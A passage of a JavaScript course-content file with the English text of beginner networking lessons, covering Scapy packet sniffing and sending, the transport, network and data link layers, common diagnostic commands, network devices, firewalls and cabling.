              <li><strong>DNS</strong> converts domain names to IP addresses (port 53)</li>
              <li><strong>GET</strong> reads data, <strong>POST</strong> sends data</li>
              <li>A <strong>URL</strong> has: scheme, host, port, path, and query</li>
            </ul>
          </div>
        `
      },
      {}, // Page 11: simulation — skip
      {}, // Page 12: questions — skip
    ]
  },

  // ========== CHAPTER 5 ==========
  5: {
    titleEn: "Scapy",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Introduction to Scapy",
        contentEn: `
          <p><strong>Scapy</strong> is a Python library for working with network packets at a low level.</p>
          <p>With Scapy you can:</p>
          <ul>
            <li><strong>Sniff</strong> — capture packets from the network</li>
            <li><strong>Build</strong> — create custom packets from scratch</li>
            <li><strong>Send</strong> — send your own packets to the network</li>
            <li><strong>Analyze</strong> — read and understand packet fields</li>
          </ul>
          <p>Scapy is different from Wireshark: Wireshark only shows packets, but Scapy lets you create and send them too.</p>
          <p>Install: <code>pip install scapy</code></p>
        `
      },
      {
        // Page 1: demo
        titleEn: "Basic Sniffing with Scapy",
        contentEn: `
          <p>Capture packets with the <code>sniff()</code> function:</p>
          <div class="code-preview">
            <pre><code>from scapy.all import *

packets = sniff(count=10)
print(packets.summary())

# Sniff with a filter (only TCP):
packets = sniff(filter="tcp", count=5)

# Sniff for 10 seconds:
packets = sniff(timeout=10)</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>sniff(count=10)</code> — captures 10 packets and stops</li>
              <li><code>filter="tcp"</code> — captures only TCP packets (uses BPF syntax)</li>
              <li><code>timeout=10</code> — captures for 10 seconds</li>
              <li><code>.summary()</code> — shows a short description of each packet</li>
            </ul>
          </div>
          <p>You need admin/root permissions to sniff packets.</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "Filtering Packets — lfilter",
        contentEn: `
          <p>You can filter packets with a Python function using <code>lfilter</code>:</p>
          <div class="code-preview">
            <pre><code># Only packets with IP layer:
sniff(lfilter=lambda p: p.haslayer(IP), count=5)

# Only HTTP (port 80):
sniff(lfilter=lambda p: p.haslayer(TCP) and
      p[TCP].dport == 80, count=5)</code></pre>
          </div>
          <ul>
            <li><code>lfilter</code> gets a function that returns True or False</li>
            <li><code>p.haslayer(IP)</code> — checks if the packet has an IP layer</li>
            <li><code>p[TCP].dport</code> — gets the destination port from the TCP layer</li>
          </ul>
          <p><code>lfilter</code> is more flexible than <code>filter</code> because you can use any Python logic.</p>
        `
      },
      {
        // Page 3: explanation
        titleEn: "Building Packets — IP/TCP/ICMP",
        contentEn: `
          <p>Scapy lets you build packets layer by layer:</p>
          <div class="code-preview">
            <pre><code># Create an IP packet:
pkt = IP(dst="8.8.8.8")

# Add TCP layer:
pkt = IP(dst="8.8.8.8") / TCP(dport=80)

# Create an ICMP (ping) packet:
pkt = IP(dst="8.8.8.8") / ICMP()

# Show packet details:
pkt.show()</code></pre>
          </div>
          <ul>
            <li><code>IP(dst="...")</code> — creates an IP layer with a destination address</li>
            <li><code>TCP(dport=80)</code> — creates a TCP layer with destination port 80</li>
            <li><code>ICMP()</code> — creates an ICMP (ping) layer</li>
            <li>The <code>/</code> operator stacks layers together</li>
            <li><code>.show()</code> — displays all fields of the packet</li>
          </ul>
        `
      },
      {
        // Page 4: demo
        titleEn: "Sending Packets",
        contentEn: `
          <p>Send packets you created:</p>
          <div class="code-preview">
            <pre><code># Send at Layer 3 (IP level):
send(IP(dst="8.8.8.8") / ICMP())

# Send and receive reply:
ans, unans = sr(IP(dst="8.8.8.8") / ICMP())

# Send one packet and get one reply:
reply = sr1(IP(dst="8.8.8.8") / ICMP())
print(reply.summary())</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>send()</code> — sends a packet, does not wait for a reply</li>
              <li><code>sr()</code> — Send and Receive: sends and collects replies</li>
              <li><code>sr1()</code> — sends one packet and returns one reply</li>
              <li><code>ans</code> — answered packets, <code>unans</code> — unanswered packets</li>
            </ul>
          </div>
          <p>You need admin/root permissions to send raw packets.</p>
        `
      },
      {
        // Page 5: explanation
        titleEn: "Advanced Sniffing — Field Details",
        contentEn: `
          <p>You can access specific fields in captured packets:</p>
          <div class="code-preview">
            <pre><code>packets = sniff(count=5)

for pkt in packets:
    if pkt.haslayer(IP):
        print("Source:", pkt[IP].src)
        print("Dest:", pkt[IP].dst)
    if pkt.haslayer(TCP):
        print("Src Port:", pkt[TCP].sport)
        print("Dst Port:", pkt[TCP].dport)</code></pre>
          </div>
          <ul>
            <li><code>pkt[IP].src</code> — source IP address</li>
            <li><code>pkt[IP].dst</code> — destination IP address</li>
            <li><code>pkt[TCP].sport</code> — source port</li>
            <li><code>pkt[TCP].dport</code> — destination port</li>
            <li><code>pkt[Raw].load</code> — the raw data (payload)</li>
          </ul>
          <p>You can also save packets to a file: <code>wrpcap("capture.pcap", packets)</code></p>
          <p>And read them back: <code>packets = rdpcap("capture.pcap")</code></p>
        `
      },
      {
        // Page 6: summary
        titleEn: "Chapter 5 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li><strong>Scapy</strong> is a Python library for sniffing, building, and sending packets</li>
              <li><code>sniff()</code> captures packets. Use <code>count</code>, <code>filter</code>, or <code>timeout</code></li>
              <li><code>lfilter</code> lets you filter with any Python function</li>
              <li>Build packets with <code>IP()</code>, <code>TCP()</code>, <code>ICMP()</code>. Stack with <code>/</code></li>
              <li><code>send()</code> sends packets. <code>sr()</code> sends and receives replies</li>
              <li>Access fields: <code>pkt[IP].src</code>, <code>pkt[TCP].dport</code>, etc.</li>
              <li>Requires admin/root permissions</li>
            </ul>
          </div>
        `
      },
      {}, // Page 7: questions — skip
    ]
  },

  // ========== CHAPTER 6 ==========
  6: {
    titleEn: "The Transport Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Role of the Transport Layer",
        contentEn: `
          <p>The <strong>Transport Layer</strong> (Layer 4) provides <strong>process-to-process</strong> communication.</p>
          <p>The Network Layer (Layer 3) delivers data to the right <strong>computer</strong>.</p>
          <p>The Transport Layer delivers data to the right <strong>program</strong> on that computer.</p>
          <ul>
            <li>Your computer runs many programs at the same time: browser, email, chat</li>
            <li>Each program needs to receive only its own data</li>
            <li>The Transport Layer uses <strong>port numbers</strong> to separate the data</li>
          </ul>
          <p>Two main protocols: <strong>TCP</strong> (reliable) and <strong>UDP</strong> (fast).</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Ports",
        contentEn: `
          <p>A <strong>port</strong> is a number (0–65535) that identifies a program on a computer.</p>
          <p><strong>Analogy:</strong></p>
          <ul>
            <li>IP address = the building address</li>
            <li>Port = the apartment number</li>
          </ul>
          <p>The mail carrier (IP) delivers the letter to the building. The port tells which apartment gets the letter.</p>
          <p><strong>Full address:</strong> <code>192.168.1.5:443</code> means IP <code>192.168.1.5</code>, port <code>443</code>.</p>
          <p>Each connection has <strong>four numbers</strong>: source IP, source port, destination IP, destination port.</p>
        `
      },
      {
        // Page 2: demo
        titleEn: "The netstat Command",
        contentEn: `
          <p><code>netstat</code> shows all active network connections on your computer:</p>
          <div class="code-preview">
            <pre><code>C:&gt; netstat -an

Proto  Local Address        Foreign Address      State
TCP    0.0.0.0:80           0.0.0.0:0            LISTENING
TCP    192.168.1.5:52431    93.184.216.34:443    ESTABLISHED
UDP    0.0.0.0:53           *:*</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>LISTENING</code> — a server is waiting for connections on this port</li>
              <li><code>ESTABLISHED</code> — an active connection between your computer and a remote server</li>
              <li><code>Local Address</code> — your IP and port</li>
              <li><code>Foreign Address</code> — the remote IP and port</li>
              <li><code>-a</code> — show all connections, <code>-n</code> — show numbers (not names)</li>
            </ul>
          </div>
        `
      },
      {
        // Page 3: explanation
        titleEn: "TCP vs UDP",
        contentEn: `
          <p>The Transport Layer has two main protocols:</p>
          <p><strong>TCP</strong> (Transmission Control Protocol):</p>
          <ul>
            <li>Reliable — makes sure all data arrives</li>
            <li>Ordered — data arrives in the right order</li>
            <li>Connection-based — needs a handshake before sending</li>
            <li>Slower — has extra checks</li>
            <li>Used for: web pages, email, file transfer</li>
          </ul>
          <p><strong>UDP</strong> (User Datagram Protocol):</p>
          <ul>
            <li>No guarantee — data can be lost</li>
            <li>No order — packets can arrive out of order</li>
            <li>No connection — just sends the data</li>
            <li>Faster — no extra checks</li>
            <li>Used for: video calls, online games, DNS</li>
          </ul>
        `
      },
      {
        // Page 4: explanation
        titleEn: "TCP Three-Way Handshake",
        contentEn: `
          <p>Before TCP can send data, the two sides must connect. This takes <strong>three steps</strong>:</p>
          <ul>
            <li><strong>Step 1 — SYN</strong>: The client sends a SYN (synchronize) packet to the server. "I want to connect."</li>
            <li><strong>Step 2 — SYN-ACK</strong>: The server replies with SYN-ACK. "OK, I agree to connect."</li>
            <li><strong>Step 3 — ACK</strong>: The client sends ACK (acknowledge). "Great, connection is ready."</li>
          </ul>
          <p>After these three steps, the connection is <strong>established</strong> and both sides can send data.</p>
          <p>This is called the <strong>Three-Way Handshake</strong>.</p>
          <p>You can see these three packets in Wireshark at the start of every TCP connection.</p>
        `
      },
      {}, // Page 5: simulation — skip
      {
        // Page 6: explanation
        titleEn: "Sequence Numbers and Acknowledgments",
        contentEn: `
          <p>TCP uses <strong>sequence numbers</strong> to keep data in order.</p>
          <ul>
            <li>Each byte of data gets a sequence number</li>
            <li>The sender says: "This data starts at byte number X"</li>
            <li>The receiver says: "I got everything up to byte Y, send me byte Y+1 next"</li>
          </ul>
          <p><strong>Acknowledgment (ACK)</strong></p>
          <ul>
            <li>The receiver sends an ACK for every piece of data it receives</li>
            <li>If the sender does not get an ACK, it sends the data again</li>
            <li>This is how TCP makes sure no data is lost</li>
          </ul>
          <p>In Wireshark, you can see the <code>Seq</code> and <code>Ack</code> numbers in every TCP packet.</p>
        `
      },
      {
        // Page 7: summary
        titleEn: "Chapter 6 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Transport Layer</strong> delivers data to the right program using <strong>ports</strong></li>
              <li><strong>TCP</strong> is reliable and ordered. <strong>UDP</strong> is fast but not guaranteed</li>
              <li>TCP uses a <strong>Three-Way Handshake</strong>: SYN → SYN-ACK → ACK</li>
              <li><strong>Sequence numbers</strong> keep data in order. <strong>ACKs</strong> confirm delivery</li>
              <li><code>netstat</code> shows active connections and listening ports</li>
              <li>Well-known ports: 80 (HTTP), 443 (HTTPS), 25 (SMTP), 53 (DNS)</li>
            </ul>
          </div>
        `
      },
      {
        // Page 8: explanation
        titleEn: "Well-Known and Ephemeral Ports",
        contentEn: `
          <p>Ports are divided into ranges:</p>
          <p><strong>Well-Known Ports (0–1023):</strong></p>
          <ul>
            <li><code>80</code> — HTTP (web)</li>
            <li><code>443</code> — HTTPS (secure web)</li>
            <li><code>25</code> — SMTP (sending email)</li>
            <li><code>53</code> — DNS (name resolution)</li>
            <li><code>22</code> — SSH (secure remote access)</li>
          </ul>
          <p><strong>Ephemeral Ports (1024–65535):</strong></p>
          <ul>
            <li>Used by the client side of a connection</li>
            <li>The operating system picks a random port for each new connection</li>
            <li>Example: your browser connects from port 52431 to the server's port 443</li>
          </ul>
          <p>The server always uses a known port. The client uses a random (ephemeral) port.</p>
        `
      },
      {}, // Page 9: questions — skip
    ]
  },

  // ========== CHAPTER 7 ==========
  7: {
    titleEn: "The Network Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Role of the Network Layer",
        contentEn: `
          <p>The <strong>Network Layer</strong> (Layer 3) routes packets from the source computer to the destination computer.</p>
          <p>It works <strong>across different networks</strong>. The Data Link Layer only works within one network — the Network Layer connects them all.</p>
          <ul>
            <li>Uses <strong>IP addresses</strong> to identify source and destination</li>
            <li><strong>Routers</strong> are the main devices at this layer</li>
            <li>Each router decides: "Where should I send this packet next?"</li>
          </ul>
          <p>The main protocol is <strong>IP</strong> (Internet Protocol).</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Packets",
        contentEn: `
          <p>At the Network Layer, data is called a <strong>packet</strong>.</p>
          <p>Each packet contains:</p>
          <ul>
            <li><strong>Source IP address</strong> — where the packet came from</li>
            <li><strong>Destination IP address</strong> — where the packet is going</li>
            <li><strong>Data</strong> — the payload from the upper layers (Transport + Application data)</li>
          </ul>
          <p>Packets travel <strong>independently</strong>. Two packets to the same destination can take different paths.</p>
          <p>The Network Layer does not guarantee delivery. If a packet is lost, TCP (Layer 4) will ask to resend it.</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "IP Packet Structure — Header and Fields",
        contentEn: `
          <p>The IP header is at least <strong>20 bytes</strong> long. Important fields:</p>
          <ul>
            <li><strong>Version</strong> — IPv4 (4) or IPv6 (6)</li>
            <li><strong>TTL</strong> (Time to Live) — a counter. Each router decreases it by 1. When it reaches 0, the packet is dropped. This prevents packets from looping forever.</li>
            <li><strong>Protocol</strong> — which Layer 4 protocol is inside: TCP (6), UDP (17), ICMP (1)</li>
            <li><strong>Source IP</strong> — sender's address (4 bytes)</li>
            <li><strong>Destination IP</strong> — receiver's address (4 bytes)</li>
            <li><strong>Total Length</strong> — size of the entire packet in bytes</li>
          </ul>
          <p>You can see all these fields in Wireshark by clicking on the "Internet Protocol" layer.</p>
        `
      },
      {
        // Page 3: explanation
        titleEn: "Subnet Mask and Default Gateway",
        contentEn: `
          <p><strong>Subnet Mask</strong></p>
          <p>Tells the computer which part of the IP address is the <strong>network</strong> and which part is the <strong>host</strong>.</p>
          <ul>
            <li>Example: IP <code>192.168.1.5</code>, Mask <code>255.255.255.0</code></li>
            <li>Network part: <code>192.168.1</code> — all devices on this network share this</li>
            <li>Host part: <code>.5</code> — unique to this device</li>
          </ul>
          <p><strong>Default Gateway</strong></p>
          <ul>
            <li>The router that connects your local network to the outside world</li>
            <li>When you send a packet to a different network, it goes to the gateway first</li>
            <li>Usually the first or last address in the network: <code>192.168.1.1</code></li>
          </ul>
        `
      },
      {
        // Page 4: explanation
        titleEn: "ICMP, DHCP, and NAT",
        contentEn: `
          <p><strong>ICMP</strong> (Internet Control Message Protocol)</p>
          <ul>
            <li>Used for network diagnostics and error messages</li>
            <li><code>ping</code> uses ICMP to check if a host is reachable</li>
            <li><code>traceroute</code> uses ICMP to find the path to a destination</li>
          </ul>
          <p><strong>DHCP</strong> (Dynamic Host Configuration Protocol)</p>
          <ul>
            <li>Automatically gives your computer an IP address when you connect to a network</li>
            <li>Also provides: subnet mask, default gateway, DNS server</li>
          </ul>
          <p><strong>NAT</strong> (Network Address Translation)</p>
          <ul>
            <li>Your home router has one public IP, but many devices at home have private IPs</li>
            <li>NAT translates between private and public addresses</li>
            <li>This is why all your home devices can share one internet connection</li>
          </ul>
        `
      },
      {}, // Page 5: thinkOutside — skip
      {
        // Page 6: demo
        titleEn: "Traceroute",
        contentEn: `
          <p><code>traceroute</code> (Linux/Mac) or <code>tracert</code> (Windows) shows the path a packet takes:</p>
          <div class="code-preview">
            <pre><code>C:&gt; tracert www.google.com

 1    1 ms    &lt;1 ms   &lt;1 ms   192.168.1.1
 2   12 ms    11 ms   12 ms   10.0.0.1
 3   15 ms    14 ms   15 ms   72.14.215.85
 4   16 ms    15 ms   16 ms   142.250.185.46</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>Each line is one <strong>hop</strong> — a router the packet passed through</li>
              <li>The three time values are three separate measurements (in milliseconds)</li>
              <li>Hop 1 is usually your home router</li>
              <li>The last hop is the destination server</li>
              <li>Traceroute works by sending packets with increasing TTL values (1, 2, 3...)</li>
            </ul>
          </div>
        `
      },
      {
        // Page 7: summary
        titleEn: "Chapter 7 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Network Layer</strong> routes packets between different networks using IP addresses</li>
              <li>The IP header has: source IP, destination IP, TTL, protocol, and more (minimum 20 bytes)</li>
              <li><strong>Subnet mask</strong> separates the network part from the host part of an IP address</li>
              <li><strong>Default gateway</strong> is the router that connects to external networks</li>
              <li><strong>ICMP</strong> is used for ping and traceroute</li>
              <li><strong>DHCP</strong> automatically assigns IP addresses</li>
              <li><strong>NAT</strong> lets many devices share one public IP</li>
              <li><strong>Routing table</strong> tells the router where to send each packet</li>
            </ul>
          </div>
        `
      },
      {
        // Page 8: explanation
        titleEn: "Routing Table",
        contentEn: `
          <p>A <strong>routing table</strong> tells a router (or computer) where to send packets.</p>
          <p>Each entry in the table says: "To reach network X, send the packet to Y."</p>
          <ul>
            <li><strong>Destination</strong> — the target network</li>
            <li><strong>Gateway</strong> — the next router to send the packet to</li>
            <li><strong>Interface</strong> — which network card to use</li>
          </ul>
          <p>You can see your routing table with:</p>
          <ul>
            <li>Windows: <code>route print</code></li>
            <li>Linux/Mac: <code>route -n</code> or <code>ip route</code></li>
          </ul>
          <p>The <strong>default route</strong> (0.0.0.0) is used when no other entry matches — it sends the packet to the default gateway.</p>
        `
      },
      {}, // Page 9: simulation — skip
      {}, // Page 10: simulation — skip
      {}, // Page 11: questions — skip
    ]
  },

  // ========== CHAPTER 8 ==========
  8: {
    titleEn: "The Data Link Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Role of the Data Link Layer",
        contentEn: `
          <p>The <strong>Data Link Layer</strong> (Layer 2) moves data between two devices that are <strong>directly connected</strong>.</p>
          <p>While the Network Layer finds the path across the internet, the Data Link Layer handles each individual link in that path.</p>
          <ul>
            <li>Works within a <strong>local network</strong> (LAN)</li>
            <li>Uses <strong>MAC addresses</strong> to identify devices</li>
            <li>Detects errors in transmitted data</li>
            <li>The main protocol is <strong>Ethernet</strong></li>
          </ul>
          <p>Think of it like this: the Network Layer is the GPS that plans the route, and the Data Link Layer is the driver that handles each road segment.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Ethernet and MAC Addresses",
        contentEn: `
          <p><strong>Ethernet</strong> is the most common protocol for local networks (wired connections).</p>
          <p><strong>MAC Address</strong> (Media Access Control):</p>
          <ul>
            <li>A unique address for each network card (NIC)</li>
            <li><strong>6 bytes</strong> long, written in hexadecimal: <code>AA:BB:CC:DD:EE:FF</code></li>
            <li>Set by the manufacturer — built into the hardware</li>
            <li>Also called a "physical address"</li>
          </ul>
          <p><strong>Difference from IP:</strong></p>
          <ul>
            <li>IP address — logical, can change (assigned by DHCP)</li>
            <li>MAC address — physical, permanent (set in factory)</li>
          </ul>
          <p>The broadcast MAC address <code>FF:FF:FF:FF:FF:FF</code> sends to all devices on the local network.</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "Ethernet Frame Structure",
        contentEn: `
          <p>At Layer 2, data is called a <strong>frame</strong>. An Ethernet frame has these parts:</p>
          <ul>
            <li><strong>Preamble</strong> (8 bytes) — a pattern of bits that tells the receiver: "a frame is coming"</li>
            <li><strong>Destination MAC</strong> (6 bytes) — the MAC address of the receiver</li>
            <li><strong>Source MAC</strong> (6 bytes) — the MAC address of the sender</li>
            <li><strong>EtherType</strong> (2 bytes) — tells which Layer 3 protocol is inside (0x0800 = IPv4, 0x0806 = ARP)</li>
            <li><strong>Payload</strong> (46–1500 bytes) — the data from the upper layers (IP packet)</li>
            <li><strong>FCS</strong> (4 bytes) — Frame Check Sequence, used to detect errors</li>
          </ul>
          <p>If FCS shows an error, the frame is dropped. The upper layers handle retransmission.</p>
        `
      },
      {
        // Page 3: demo
        titleEn: "ipconfig / ifconfig",
        contentEn: `
          <p>You can see your network settings with these commands:</p>
          <div class="code-preview">
            <pre><code># Windows:
C:&gt; ipconfig /all

Ethernet adapter:
  Physical Address: AA-BB-CC-DD-EE-FF
  IPv4 Address: 192.168.1.5
  Subnet Mask: 255.255.255.0
  Default Gateway: 192.168.1.1

# Linux/Mac:
$ ifconfig
eth0: flags=4163  mtu 1500
      inet 192.168.1.5  netmask 255.255.255.0
      ether aa:bb:cc:dd:ee:ff</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>Physical Address</code> / <code>ether</code> — your MAC address</li>
              <li><code>IPv4 Address</code> / <code>inet</code> — your IP address</li>
              <li><code>Subnet Mask</code> / <code>netmask</code> — your subnet mask</li>
              <li><code>Default Gateway</code> — your router's address</li>
            </ul>
          </div>
        `
      },
      {
        // Page 4: explanation
        titleEn: "ARP Protocol",
        contentEn: `
          <p><strong>ARP</strong> — Address Resolution Protocol</p>
          <p>ARP converts an <strong>IP address</strong> to a <strong>MAC address</strong>.</p>
          <p><strong>Why do we need ARP?</strong></p>
          <ul>
            <li>The Network Layer uses IP addresses</li>
            <li>The Data Link Layer uses MAC addresses</li>
            <li>To send a frame, you need the destination's MAC address</li>
            <li>ARP finds the MAC address when you only know the IP</li>
          </ul>
          <p><strong>How ARP works:</strong></p>
          <ul>
            <li>Your computer broadcasts: "Who has IP 192.168.1.1? Tell me your MAC address"</li>
            <li>The device with that IP replies: "I have 192.168.1.1, my MAC is AA:BB:CC:DD:EE:FF"</li>
            <li>Your computer saves this in its <strong>ARP table</strong> (cache)</li>
          </ul>
          <p>View your ARP table: <code>arp -a</code></p>
        `
      },
      {}, // Page 5: simulation — skip
      {
        // Page 6: summary
        titleEn: "Chapter 8 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Data Link Layer</strong> handles communication between directly connected devices</li>
              <li><strong>MAC addresses</strong> are 6-byte hardware addresses, set by the manufacturer</li>
              <li>An <strong>Ethernet frame</strong> has: preamble, destination MAC, source MAC, EtherType, payload, and FCS</li>
              <li><strong>ARP</strong> converts IP addresses to MAC addresses</li>
              <li>ARP sends a broadcast question and gets a unicast answer</li>
              <li>Use <code>ipconfig</code> (Windows) or <code>ifconfig</code> (Linux/Mac) to see your network settings</li>
              <li>Use <code>arp -a</code> to see the ARP table</li>
            </ul>
          </div>
        `
      },
      {}, // Page 7: questions — skip
    ]
  },

  // ========== CHAPTER 9 ==========
  9: {
    titleEn: "Network Devices",
    pages: [
      {
        // Page 0: Hub
        titleEn: "Hub — The Simplest Device",
        contentEn: `
          <p>A <strong>Hub</strong> is the simplest network device.</p>
          <p>It receives a signal on one port and <strong>sends it to all other ports</strong>.</p>
          <ul>
            <li>Works at <strong>Layer 1</strong> (Physical Layer)</li>
            <li>Does not read addresses — just copies the signal</li>
            <li>All devices share the same bandwidth</li>
            <li>Creates <strong>collisions</strong> when two devices send at the same time</li>
          </ul>
          <p>Hubs are almost never used today. Switches replaced them.</p>
        `
      },
      {
        // Page 1: Switch
        titleEn: "Switch — Smart Forwarding",
        contentEn: `
          <p>A <strong>Switch</strong> is smarter than a hub.</p>
          <p>It learns which device is connected to which port using <strong>MAC addresses</strong>.</p>
          <ul>
            <li>Works at <strong>Layer 2</strong> (Data Link Layer)</li>
            <li>Keeps a <strong>MAC address table</strong> — maps each MAC to a port</li>
            <li>Sends frames <strong>only to the correct port</strong>, not to all ports</li>
            <li>Each port gets its own bandwidth — no collisions</li>
          </ul>
          <p><strong>How does the switch learn?</strong></p>
          <ul>
            <li>When a frame arrives, the switch reads the <strong>source MAC</strong> and saves it</li>
            <li>If it does not know the destination MAC, it floods to all ports (like a hub)</li>
            <li>Over time, the table fills up and traffic is efficient</li>
          </ul>
        `
      },
      {
        // Page 2: Router
        titleEn: "Router — Connecting Different Networks",
        contentEn: `
          <p>A <strong>Router</strong> connects different networks together.</p>
          <p>It reads <strong>IP addresses</strong> and decides the best path for each packet.</p>
          <ul>
            <li>Works at <strong>Layer 3</strong> (Network Layer)</li>
            <li>Has a <strong>routing table</strong> — tells it where to send each packet</li>
            <li>Connects your home network to the Internet</li>
            <li>Can connect networks with different technologies (WiFi to Ethernet)</li>
          </ul>
          <p><strong>Key difference from a switch:</strong></p>
          <ul>
            <li>Switch uses MAC addresses (Layer 2) — works inside one network</li>
            <li>Router uses IP addresses (Layer 3) — works between networks</li>
          </ul>
        `
      },
      {
        // Page 3: Comparison table
        titleEn: "Hub vs Switch vs Router",
        contentEn: `
          <p>Let's compare the three devices:</p>
          <table>
            <thead>
              <tr><th>Feature</th><th>Hub</th><th>Switch</th><th>Router</th></tr>
            </thead>
            <tbody>
              <tr><td>OSI Layer</td><td>1 (Physical)</td><td>2 (Data Link)</td><td>3 (Network)</td></tr>
              <tr><td>Uses</td><td>Electrical signal</td><td>MAC addresses</td><td>IP addresses</td></tr>
              <tr><td>Sends to</td><td>All ports</td><td>Correct port only</td><td>Next hop router</td></tr>
              <tr><td>Collisions</td><td>Yes</td><td>No</td><td>No</td></tr>
              <tr><td>Connects</td><td>Devices in one LAN</td><td>Devices in one LAN</td><td>Different networks</td></tr>
            </tbody>
          </table>
          <p><strong>Remember:</strong> Hub = dumb, Switch = smart inside a network, Router = connects networks.</p>
        `
      },
      {
        // Page 4: VLAN
        titleEn: "VLAN — Virtual LAN",
        contentEn: `
          <p>A <strong>VLAN</strong> (Virtual LAN) splits one physical switch into separate logical networks.</p>
          <ul>
            <li>Devices in the same VLAN can talk to each other</li>
            <li>Devices in different VLANs <strong>cannot</strong> talk without a router</li>
            <li>This improves <strong>security</strong> and <strong>performance</strong></li>
          </ul>
          <p><strong>Example:</strong></p>
          <ul>
            <li>VLAN 10 = Accounting department</li>
            <li>VLAN 20 = Engineering department</li>
            <li>Both use the same switch, but they are isolated</li>
          </ul>
          <p><strong>Trunk port:</strong> A special port that carries traffic from multiple VLANs between switches. It adds a <strong>VLAN tag</strong> (802.1Q) to each frame.</p>
        `
      },
      {
        // Page 5: Firewall
        titleEn: "Firewall — Network Security Guard",
        contentEn: `
          <p>A <strong>Firewall</strong> filters network traffic based on rules.</p>
          <p>It decides what traffic is <strong>allowed in</strong> and what is <strong>blocked</strong>.</p>
          <ul>
            <li><strong>Packet filter</strong> — checks IP addresses and ports (Layer 3-4)</li>
            <li><strong>Stateful firewall</strong> — tracks connections, allows replies to outgoing requests</li>
            <li><strong>Application firewall (WAF)</strong> — inspects HTTP content (Layer 7)</li>
          </ul>
          <p><strong>Example rules:</strong></p>
          <ul>
            <li>Allow incoming traffic on port 443 (HTTPS) — ✅</li>
            <li>Block incoming traffic on port 23 (Telnet) — ❌</li>
            <li>Allow outgoing traffic to any destination — ✅</li>
          </ul>
          <p>Most home routers have a built-in firewall.</p>
        `
      },
      {
        // Page 6: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 7: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>Hub</strong> — Layer 1, sends to all ports, causes collisions</li>
            <li><strong>Switch</strong> — Layer 2, learns MAC addresses, sends to correct port only</li>
            <li><strong>Router</strong> — Layer 3, uses IP addresses, connects different networks</li>
            <li><strong>VLAN</strong> — splits one switch into separate virtual networks</li>
            <li><strong>Firewall</strong> — filters traffic with allow/block rules</li>
          </ul>
          <p>Each device works at a different layer and solves a different problem.</p>
        `
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 10 ==========
  10: {
    titleEn: "The Physical Layer",
    pages: [
      {
        // Page 0: Purpose
        titleEn: "What Does the Physical Layer Do?",
        contentEn: `
          <p>The <strong>Physical Layer</strong> (Layer 1) is the bottom of the OSI model.</p>
          <p>Its job is simple: <strong>move bits</strong> (0s and 1s) from one device to another.</p>
          <ul>
            <li>It does not understand addresses, packets, or protocols</li>
            <li>It only deals with <strong>electrical signals</strong>, <strong>light</strong>, or <strong>radio waves</strong></li>
            <li>It defines cables, connectors, voltages, and frequencies</li>
          </ul>
          <p><strong>Without the Physical Layer, no data can move at all.</strong></p>
        `
      },
      {
        // Page 1: Technologies
        titleEn: "Physical Layer Technologies",
        contentEn: `
          <p>There are three main ways to transmit bits:</p>
          <ul>
            <li><strong>Copper cables</strong> — electrical signals travel through metal wires</li>
            <li><strong>Fiber optic</strong> — light pulses travel through thin glass</li>
            <li><strong>Wireless (WiFi)</strong> — radio waves travel through the air</li>
          </ul>
          <table>
            <thead>
              <tr><th>Technology</th><th>Medium</th><th>Speed</th><th>Distance</th></tr>
            </thead>
            <tbody>
              <tr><td>Copper (Cat5e)</td><td>Electrical</td><td>1 Gbps</td><td>100m</td></tr>
              <tr><td>Fiber optic</td><td>Light</td><td>100+ Gbps</td><td>Kilometers</td></tr>
              <tr><td>WiFi 6</td><td>Radio</td><td>~1 Gbps</td><td>~30m indoors</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 2: Bandwidth and Latency
        titleEn: "Bandwidth and Latency",
        contentEn: `
          <p>Two important terms for network speed:</p>
          <p><strong>Bandwidth</strong> — how much data can flow per second.</p>
          <ul>
            <li>Measured in <strong>bps</strong> (bits per second)</li>
            <li>Like the width of a pipe — wider pipe = more water</li>
            <li>Example: 100 Mbps = 100 million bits per second</li>
          </ul>
          <p><strong>Latency</strong> — how long it takes for data to arrive.</p>
          <ul>
            <li>Measured in <strong>milliseconds (ms)</strong></li>
            <li>Like the length of the pipe — longer pipe = more delay</li>
            <li>Example: 20 ms latency to a server in your country</li>
          </ul>
          <p><strong>Important:</strong> High bandwidth does not mean low latency. A satellite link has high bandwidth but high latency (~600 ms).</p>
        `
      },
      {
        // Page 3: Cables and Standards
        titleEn: "Cables and Standards",
        contentEn: `
          <p><strong>Ethernet cables</strong> (twisted pair) are the most common:</p>
          <ul>
            <li><strong>Cat5e</strong> — up to 1 Gbps, 100 meters max</li>
            <li><strong>Cat6</strong> — up to 10 Gbps (short distances)</li>
            <li><strong>Cat6a</strong> — up to 10 Gbps at 100 meters</li>
          </ul>
          <p><strong>Connectors:</strong></p>
          <ul>
            <li><strong>RJ-45</strong> — standard Ethernet connector (8 pins)</li>
            <li><strong>Straight-through cable</strong> — connects different devices (PC to switch)</li>
            <li><strong>Crossover cable</strong> — connects same devices (PC to PC)</li>
          </ul>
